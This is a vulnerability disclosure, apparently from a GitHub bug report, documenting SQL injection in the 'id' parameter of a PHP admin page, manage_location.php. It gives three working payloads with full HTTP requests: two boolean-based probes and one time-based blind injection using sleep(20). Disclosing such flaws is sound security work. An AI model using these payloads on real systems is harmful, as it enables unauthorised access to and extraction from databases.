BUG_Author:garrett

Vulnerability File: /vaccinated/admin/maintenance/manage_location.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=1' and 996=996 and 'a'='a

```
GET /vaccinated/admin/maintenance/manage_location.php?id=1%27%20and%20996=996%20and%20%27a%27=%27a HTTP/1.1
Host: localhost
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=s2tgt6ls6vslcot7kuqgp70v0r
Connection: close
```

The sql statement is executed correctly

![image](https://github.com/ZERO-XX-ONE/bug_report/blob/main/sql1.png)

Payload2:id=1' and 996=996 and 'a'='b

```
GET /vaccinated/admin/maintenance/manage_location.php?id=1%27%20and%20996=996%20and%20%27a%27=%27b HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=s2tgt6ls6vslcot7kuqgp70v0r
Connection: close
```

The sql statement was executed incorrectly, causing the page not to be echoed normally

![image](https://github.com/ZERO-XX-ONE/bug_report/blob/main/sql2.png)

Payload3:id=1' and (select 1 from (select(sleep(20)))c) AND 'd'='d

```
GET /vaccinated/admin/maintenance/manage_location.php?id=1%27%20and%20(select%201%20from%20(select(sleep(20)))c)%20AND%20%27d%27=%27d HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=s2tgt6ls6vslcot7kuqgp70v0r
Connection: close
```

The server response time is 20 seconds

![image](https://github.com/ZERO-XX-ONE/bug_report/blob/main/sql3.png)
